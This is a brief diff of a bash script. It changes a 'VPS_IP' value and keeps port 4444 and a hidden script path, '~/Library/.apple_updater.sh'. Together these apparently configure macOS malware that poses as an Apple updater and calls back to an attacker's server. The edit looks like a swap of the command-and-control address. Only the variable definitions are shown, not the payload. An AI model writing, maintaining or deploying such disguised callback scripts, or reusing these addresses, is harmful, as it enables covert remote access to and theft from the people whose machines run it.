@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # Define values
-VPS_IP="62.60.207.33"
+VPS_IP="185.173.104.191"
 VPS_PORT="4444"
 USER_HOME="$HOME"
 SCRIPT_PATH="$USER_HOME/Library/.apple_updater.sh"
